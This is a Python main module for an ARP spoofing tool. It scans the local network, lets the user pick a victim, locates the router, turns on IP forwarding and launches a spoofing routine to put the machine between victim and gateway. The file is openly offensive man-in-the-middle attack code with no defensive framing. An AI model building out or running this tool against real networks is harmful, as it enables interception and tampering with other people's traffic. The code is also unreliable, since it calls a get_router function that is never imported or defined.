from .network_utils import scan_network, select_target, toggle_forwarding
from .spoofer_logic import spoof

def main():
    print("[+] Start")

    scan_network()

    target_ip, target_mac = select_target()

    if not target_ip:
        print("[-] No target selected. Exiting.")
        return
    
    router_ip, router_mac = get_router()

    if not router_ip:
        print("[-] Router not found. Exiting.")
        return
    
    print("[+] Enabling IP forwarding...")
    toggle_forwarding(True)

    print("[+] Starting ARP spoofing...")
    spoof(target_ip, target_mac, router_ip, router_mac)

if __name__ == "__main__":
    main()